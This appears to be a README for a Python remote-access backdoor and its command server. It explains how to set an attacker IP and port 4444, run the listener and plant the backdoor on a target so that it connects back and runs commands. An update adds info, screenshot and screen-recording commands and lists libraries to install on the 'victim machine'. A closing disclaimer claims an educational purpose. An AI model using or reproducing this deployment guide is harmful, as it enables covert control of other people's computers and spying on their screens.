# Server and Backdoor 
This project contains a Python backdoor and server script that work together to establish a remote connection between a target machine and an operator. The backdoor runs on the target, connecting back to the server, which listens for incoming connections. 
Once connected, the server can send commands to the backdoor, which executes them on the target and returns the output.

Instructions:

1. Install Python 3
  
2. Installer termcolor: pip install termcolor

3. Configure the Server:
  Open server.py and set:
    IP address: The server’s local or public IP.
    Port: An open TCP port (e.g., 4444).
      Example in code:
        host = "192.168.1.10"  # your attacker machine IP
        port = 4444

4. Configure the Backdoor:
   In backdoor.py, set:
    The server IP to point to your attacker machine. The port to match the server port.
      Example:
        server_ip = "192.168.1.10"
        server_port = 4444

5. Run the Server: python3 server.py

6. Deploy the Backdoor:
   Run backdoor.py on the target machine:
    python3 backdoor.py


Once it connects, the server will show: [+] Connection established with <target_ip>

# Server and Backdoor update (10/25/2025):
Both the Server and Backdoor projects have been updated to support the following functionalities:

1. **Info Command**: This command allows users to quickly retrieve information about the target machine.

2. **Screenshot Command**: This command can capture the screen, encode the image in Base64 format, and send it to the server user. The server then saves the screenshot locally.

3. **Record Command**: This command enables screen recording to a temporary file, which is sent to the server when the recording is stopped. The server now properly manages the metadata and saves the recording in a designated local folder.

## Required Python Libraries

Install the following new libraries on the **victim machine**:

```bash
pip install mss
pip install Pillow
pip install numpy
pip install opencv-python
pip install pyautogui
```
# Disclaimer:
This repository is created strictly for educational and ethical cybersecurity research. All code, scripts, and demonstrations are intended for use in controlled environments, on systems you own, or on systems where you have explicit written permission to test.
The author is not responsible for any misuse, damage, or illegal activities performed with the information provided here.
Use responsibly. Stay ethical.
